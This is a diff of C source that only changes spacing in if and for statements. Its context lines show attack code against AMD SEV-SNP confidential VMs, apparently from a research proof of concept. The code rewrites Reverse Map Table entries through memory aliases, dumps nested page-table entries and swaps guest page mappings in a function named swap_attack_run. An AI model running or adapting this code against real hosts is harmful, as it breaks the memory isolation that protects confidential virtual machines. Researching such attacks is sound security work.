@@ -49,7 +49,7 @@ int write_rmp_by_gpa(uint64_t pa_rmp_start, uint64_t pa_rmp_end, uint64_t target
   //search rmp for entry for target_gpa
   rmp_entry_t* orig_entry = NULL;
   size_t idx_orig_entry = 0;
-  for(size_t i = 0; i < rmp_len; i++) {
+  for (size_t i = 0; i < rmp_len; i++) {
     uint64_t  entry_gpa = rmp[i].info.gpa;
     if (entry_gpa == target_gpa) {
       orig_entry = rmp+i;
@@ -74,7 +74,7 @@ int write_rmp_by_gpa(uint64_t pa_rmp_start, uint64_t pa_rmp_end, uint64_t target
   //manipulate entry and write
   rmp_entry_t manip_entry = *orig_entry;
   manip_entry.info.gpa = new_gpa;
-  if(memcpy_topa(alias_pa_orig_entry, (void*)&manip_entry , sizeof(rmp_entry_t) , &stats , true)) {
+  if (memcpy_topa(alias_pa_orig_entry, (void*)&manip_entry , sizeof(rmp_entry_t) , &stats , true)) {
     err_log("failed to write to rmp entry at pa 0x%jx via alias 0x%jx\n", pa_orig_entry, alias_pa_orig_entry);
     goto error;
   }
@@ -177,7 +177,7 @@ int write_rmp_by_hpa(uint64_t pa_rmp_start, uint64_t pa_rmp_end, uint64_t target
     err_log("flush failed\n");
     goto error;
   }
-  if(memcpy_topa(alias_pa_orig_entry, rmp+aligned_rmp_idx , 4096 , &stats , true)) {
+  if (memcpy_topa(alias_pa_orig_entry, rmp+aligned_rmp_idx , 4096 , &stats , true)) {
     err_log("failed to write to rmp entry at pa 0x%jx via alias 0x%jx\n", pa_orig_entry, alias_pa_orig_entry);
     goto error;
   }
@@ -189,7 +189,7 @@ int write_rmp_by_hpa(uint64_t pa_rmp_start, uint64_t pa_rmp_end, uint64_t target
   //read again through original pa to ensure tha manipulation was successful
   //TODO: revert back to writing just 16 MiB. This was just some stupid debugging
   rmp_entry_t* got_manip_entries = malloc(4096);
-  if(memcpy_frompa(got_manip_entries, pa_orig_entry , 4096 , &stats , true )) {
+  if (memcpy_frompa(got_manip_entries, pa_orig_entry , 4096 , &stats , true )) {
     err_log("failed to read from rmp entry at pa 0x%jx\n", pa_orig_entry);
     goto error;
   }
@@ -259,7 +259,7 @@ int debug_print_spte_range(uint64_t qemu_pid, uint64_t gpa_start, uint64_t gpa_e
                            uint64_t step_size, pg_level_t target_level) {  
   const uint64_t page_size_bit_mask = 1 << 7;
   printf("Dumping PT entries for 0x%jx to 0x%jx in 0x%jx steps targeting level %d\n", gpa_start, gpa_end, step_size, target_level);
-  for(uint64_t gpa = gpa_start; gpa < gpa_end; gpa += step_size) { 
+  for (uint64_t gpa = gpa_start; gpa < gpa_end; gpa += step_size) { 
     uint64_t spte_raw, spte_hpa;
     if (ioctl_get_spte(qemu_pid, gpa , target_level, &spte_raw , &spte_hpa )) {
       err_log("ioctl_get_spte for gpa 0x%jx failed\n", gpa);
@@ -310,12 +310,12 @@ int swap_attack_run(uint64_t qemu_pid, uint64_t rmp_start, uint64_t rmp_end, ali
   
   //Swap entries on rmp level
   printf("Setting gfn in rmp entry for gpa1 to 0x%jx\n", gfn2_2mb);
-	if(write_rmp_by_hpa(rmp_start, rmp_end, hpa1_2mb  ,alias_data , gfn2_2mb)) {
+	if (write_rmp_by_hpa(rmp_start, rmp_end, hpa1_2mb  ,alias_data , gfn2_2mb)) {
 		err_log("failed to update rmp for gpa1 0x%jx\n", gpa1);
 		return -1;
 	}
   printf("Setting gfn entry in rmp for gpa2 to 0x%jx\n", gfn1_2mb);
-	if(write_rmp_by_hpa(rmp_start, rmp_end , hpa2_2mb ,alias_data , gfn1_2mb)) {
+	if (write_rmp_by_hpa(rmp_start, rmp_end , hpa2_2mb ,alias_data , gfn1_2mb)) {
 		err_log("failed to update rmp for gpa2 0x%jx\n", gpa2);
 		return -1;
 	}
@@ -350,7 +350,7 @@ int swap_attack_run(uint64_t qemu_pid, uint64_t rmp_start, uint64_t rmp_end, ali
 
 
   //the npt manipulation code in the kernel should already request a tlb flush
-  // if(ioctl_tlb_flush(qemu_pid)) {
+  // if (ioctl_tlb_flush(qemu_pid)) {
   //   err_log("tlb flush failed\n");
   //   return -1;
   // }
@@ -363,11 +363,11 @@ int main(int argc, char** argv) {
     return -1;
   }
   uint64_t rmp_start,rmp_end;
-  if(do_stroul(argv[1], 0, &rmp_start)) {
+  if (do_stroul(argv[1], 0, &rmp_start)) {
     printf("Failed to parse '%s' as number\n", argv[1]);
     return -1;
   }
-  if(do_stroul(argv[2], 0 , &rmp_end )) {
+  if (do_stroul(argv[2], 0 , &rmp_end )) {
     printf("Failed to convert '%s' to number\n", argv[2]);
     return -1;
   }
@@ -375,25 +375,25 @@ int main(int argc, char** argv) {
 	rmp_end += 1;
 
   alias_data_t alias_data;
-  if(parse_csv(argv[3], &alias_data.mrs  , &alias_data.alias_masks , &alias_data.len )) {
+  if (parse_csv(argv[3], &alias_data.mrs  , &alias_data.alias_masks , &alias_data.len )) {
     err_log("failed to parse alias file at %s\n", argv[3]);
     return -1;
   }
 
   uint64_t qemu_pid;
-  if(do_stroul(argv[4], 0 , &qemu_pid)) {
+  if (do_stroul(argv[4], 0 , &qemu_pid)) {
     printf("Failed to convert '%s' to number\n", argv[4]);
     return -1;
   }
 
 	uint64_t gpa1;
-  if(do_stroul(argv[5], 0 , &gpa1)) {
+  if (do_stroul(argv[5], 0 , &gpa1)) {
     printf("Failed to convert '%s' to number\n", argv[5]);
     return -1;
   }
 
 	uint64_t gpa2;
-  if(do_stroul(argv[6], 0 , &gpa2)) {
+  if (do_stroul(argv[6], 0 , &gpa2)) {
     printf("Failed to convert '%s' to number\n", argv[6]);
     return -1;
   }
